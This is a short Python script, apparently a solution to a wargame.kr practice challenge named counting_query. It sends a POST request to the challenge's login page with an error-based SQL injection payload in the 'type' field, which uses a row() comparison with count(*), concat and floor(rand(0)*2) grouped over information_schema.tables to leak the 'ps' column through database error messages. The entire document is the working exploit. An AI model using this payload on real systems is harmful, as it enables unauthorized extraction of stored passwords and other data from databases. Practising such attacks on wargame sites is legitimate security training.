from requests import *
from time import *
url='http://wargame.kr:8080/counting_query/login_ok.php'
data={'id':'211.106.76.247','pw':'123','type':'1 or row(1,1)>(select count(*),concat(ps,floor(rand(0)*2)) as x from information_schema.tables group by x)'}
response=post(url=url,data=data)
print(response.text)